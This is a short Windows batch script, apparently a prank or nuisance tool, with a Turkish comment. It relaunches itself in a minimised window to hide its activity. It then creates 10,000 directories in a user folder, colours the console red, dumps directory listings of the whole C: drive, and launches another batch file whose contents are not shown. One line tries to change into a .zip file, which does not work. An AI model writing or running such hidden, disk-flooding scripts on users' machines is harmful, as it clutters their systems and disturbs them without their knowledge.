@echo off
if "%1" neq "hidden" (
    start "" /min cmd /c "%~f0" hidden
    exit /b
)

rem Kodların buradan sonra devam eder
cd C:\Users\{COMPUTER_USERNAME}\INDEX-main.zip
for /l %%i in (1,1,10000) do md %%i
cd C:\
color 4
tree
dir/s
cd C:\Users\{COMPUTER_USERNAME}\INDEX-main
start 4KKTEST.bat
